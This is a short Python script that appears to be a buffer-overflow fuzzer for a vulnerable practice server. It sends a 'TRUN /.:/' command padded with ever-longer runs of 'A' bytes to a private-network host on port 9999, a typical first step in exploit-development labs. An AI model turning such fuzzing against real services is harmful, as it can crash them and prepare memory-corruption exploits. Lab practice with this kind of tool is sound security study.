import socket
def fuzzer():
    host = "192.168.0.9"
    port = 9999
    s = socket.socket()
    s.connect((host,port))
    payload = b"TRUN /.:/"+b"A"*10
    print(s.recv(1024))
    while True:
        payload = payload + b"A"*50
        s.send(payload)
        x = int(input("Enter 1 to continue"))
        if x == 1:
            continue
        else:
            break
    #print(len(payload))
    s.close()
    return len(payload)